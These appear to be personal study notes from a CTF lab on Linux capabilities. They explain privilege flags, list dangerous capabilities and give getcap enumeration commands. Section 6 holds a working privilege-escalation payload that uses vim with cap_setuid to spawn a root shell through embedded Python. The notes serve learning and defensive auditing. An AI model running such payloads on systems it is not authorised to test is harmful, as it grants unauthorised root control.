# 📝 **Linux Capabilities – Notes**

## 📌 **1. What Are Linux Capabilities?**

Linux capabilities break the traditional "all-or-nothing" root privilege model.
They allow *specific privileged operations* to be assigned to executables **without giving full root access**.

Capabilities = fine-grained privileges.

Example:

* A binary can open low ports (<1024) without needing full root
* A diagnostic tool can send raw packets without root
* A backup tool can read all files without being full root

---

## 📌 **2. Why Capabilities Can Be Dangerous**

If a binary is given a powerful capability (e.g., `cap_setuid` or `cap_sys_admin`), **any user able to run it can potentially escalate privileges**.

🚨 **Especially dangerous capabilities:**

* `cap_setuid` → allows changing UID to *any user*, including root.
* `cap_sys_admin` → extremely powerful (almost root).
* `cap_setgid` → change group ID.

---

## 📌 **3. Listing Capabilities**

Recursively list all files with capabilities:

```bash
getcap -r / 2>/dev/null
```

Why redirect errors?
Non-root users cannot read many directories, so `/dev/null` hides permission errors.

---

## 📌 **4. Structure of Capability Output**

Example:

```
/home/alper/vim = cap_setuid+ep
```

Breakdown:

* **Binary:** `/home/alper/vim`
* **Capability:** `cap_setuid`
* **Flags:**

  * **e** = Effective → capability is active
  * **p** = Permitted → binary is allowed to use it

---

## 📌 **5. Common Useful Capabilities**

| Capability             | Meaning                    | Exploitation Risk |
| ---------------------- | -------------------------- | ----------------- |
| `cap_setuid`           | Change process UID         | 🔥 Very High      |
| `cap_setgid`           | Change process GID         | High              |
| `cap_net_raw`          | Send raw packets           | Medium            |
| `cap_net_bind_service` | Bind ports <1024           | Low               |
| `cap_sys_admin`        | Many administrative powers | 🔥🔥 Extreme      |

---

## 📌 **6. Exploiting Dangerous Capabilities**

### 🎯 Example: `vim` with `cap_setuid+ep`

This allows vim to **switch to root user**.

Payload used:

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
```

Explanation:

* Run python inside vim
* Use `os.setuid(0)` → switch current UID to root
* Replace vim process with a shell (exec)
* Shell starts as **root**

---

## 📌 **7. Why This Is NOT a SUID**

Capabilities are a **separate system** from SUID.

SUID files are found with:

```bash
find / -perm -4000 -type f 2>/dev/null
```

But capability-privileged binaries would NOT show here.
This makes capability-based privesc **harder to detect** unless you check for them properly.

---

## 📌 **8. Tools for Capability-Based Exploits**

### 🔗 **GTFOBins**

Many Linux binaries with capabilities can be abused.

For example:

* vim
* python
* perl
* tcpdump
* tar

Use GTFOBins to find exploitation patterns:

```
https://gtfobins.github.io
```

---

## 📌 **9. Practical Enumeration Cheat Sheet**

```bash
# List capabilities
getcap -r / 2>/dev/null

# Check permissions of any suspicious binary
ls -l /path/to/binary

# Inspect binary strings for system() calls
strings /path/to/binary | grep -i "system"

# Check if PATH hijacking is possible
echo $PATH

# Check if capability is powerful
man capabilities
```

---

## 📌 **10. Real-World CTF Example You Completed**

1. You ran:

   ```bash
   getcap -r / 2>/dev/null
   ```
2. You found:

   ```
   /home/alper/vim = cap_setuid+ep
   ```
3. You abused Python inside vim to switch UID to 0.
4. You spawned a root shell.
5. Privilege escalation **successfully achieved**.

---

# 🏁 **Summary**

* Capabilities replace full-root SUID with fine-grained privileges.
* Dangerous capabilities can still lead to full root access.
* Always enumerate with `getcap -r /`.
* Exploit using embedded interpreters (Python/Perl) when `cap_setuid` is present.


